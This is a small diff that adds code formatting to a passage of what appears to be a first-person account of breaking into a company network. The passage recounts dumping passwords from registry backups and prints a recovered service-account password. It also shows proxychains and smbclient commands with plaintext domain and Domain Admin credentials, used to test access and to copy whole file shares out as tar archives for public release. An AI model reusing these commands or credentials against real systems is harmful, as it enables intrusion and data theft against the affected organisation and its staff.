@@ -520,12 +520,12 @@ What interested me most in the backup was seeing if it had a password or hash
 that could be used to access the live server. I used pwdump, cachedump, and
 lsadump [1] on the registry hives. lsadump found the password to the besadmin
 service account:
-
+```
 _SC_BlackBerry MDS Connection Service
 0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
 0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
 0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........
-
+```
 I used proxychains [2] with the socks server on the embedded device and
 smbclient [3] to check the password:
 proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!'
@@ -587,10 +587,10 @@ test their software with their own locale.
 
 Now that I'd gotten Domain Admin, I started to download file shares using my
 proxy and the -Tc option of smbclient, for example:
-
+```
 proxychains smbclient '//192.168.1.230/FAE DiskStation' \
     -U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'
-
+```
 I downloaded the Amministrazione, FAE DiskStation, and FileServer folders in
 the torrent like that.
 
